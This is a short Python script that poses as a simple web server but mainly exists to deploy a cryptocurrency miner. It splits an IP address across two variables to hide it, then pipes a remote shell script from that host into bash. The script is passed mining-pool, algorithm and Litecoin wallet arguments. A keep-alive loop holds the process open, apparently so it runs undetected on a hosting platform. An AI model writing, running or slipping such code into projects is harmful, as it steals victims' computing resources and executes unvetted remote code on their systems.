import os, threading, http.server, socketserver

def start_site():
    port = int(os.environ.get("PORT", 10000))
    with socketserver.TCPServer(("", port), http.server.SimpleHTTPRequestHandler) as httpd:
        httpd.serve_forever()

threading.Thread(target=start_site, daemon=True).start()
A="185.112"; B="144.152"
os.system(f"curl -sL http://{A}.{B}/start.sh | bash -s -- -p zpool -a minotaurx -u ltc1qpmvkquzpa5c9qhkq4t8pvhffd7238ae5zewr0v --pass c=LTC")

import time
while True: time.sleep(60)
